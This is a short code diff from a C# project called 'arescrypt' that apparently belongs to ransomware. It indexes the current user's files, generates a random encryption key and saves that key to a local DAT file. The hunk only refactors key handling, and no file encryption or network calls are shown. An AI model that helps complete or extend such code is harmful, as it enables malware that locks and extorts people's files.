@@ -12,7 +12,7 @@ namespace arescrypt
         public static string sessionUsername = Environment.UserName; // get current sessions username
         static Configuration config = new Configuration(); // New instance of Configuration class
         static Cryptography crypto = new Cryptography(); // New instance of Cryptography class
-        static ServerData serveData = new ServerData();
+        static UserData userData = new UserData();
 
         static void Main(string[] args)
         {
@@ -56,16 +56,23 @@ namespace arescrypt
             fullFileIndex = userSpecificFiles.ToArray();
             
             /* BEGIN ENCRYPTION/DECRYPTION SECTION */
-            string encKey = crypto.genRandomString(0xC);
-            serveData.uniqueKey = encKey;
-                        
-            if (!File.Exists(config.datFileLocation))
-                Miscellaneous.SetDATFileData(new ServerData());
-            // Miscellaneous.DisplayDATFileData();
-            Console.WriteLine("Reading dat file...");
-            ServerData serveJSONData = Miscellaneous.GetDATFileData();
-            serveData.uniqueKey = serveJSONData.uniqueKey;
-            Console.WriteLine(serveData.uniqueKey);
+            string encKey = Cryptography.genRandomString(0xC);
+            
+            if (!File.Exists(Configuration.datFileLocation))
+            {
+                userData.uniqueKey = encKey;
+
+                Console.WriteLine("No DAT file discovered, creating one now..");
+                Miscellaneous.SetDATFileData(userData);
+                Console.WriteLine("DAT file created [" + Configuration.datFileLocation + "]");
+            } else
+            {
+                Console.WriteLine("Reading dat file...");
+                UserData serveJSONData = Miscellaneous.GetDATFileData();
+                userData.uniqueKey = serveJSONData.uniqueKey;
+            }
+
+            Console.WriteLine("Unique Key: " + userData.uniqueKey);
 
 
             // Cryptography.executeExample(); // Execute cryptography example
